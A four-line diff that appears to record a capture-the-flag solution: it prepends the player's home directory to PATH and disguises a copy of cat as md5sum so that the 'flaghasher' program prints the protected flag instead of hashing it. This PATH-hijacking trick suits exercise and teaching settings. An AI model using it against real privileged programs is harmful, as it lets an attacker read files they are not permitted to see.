@@ -1,0 +1,4 @@
+1. export PATH=/home/ctf-player:$PATH
+2. cp /bin/cat ./
+3. mv cat md5sum
+4. ./flaghasher
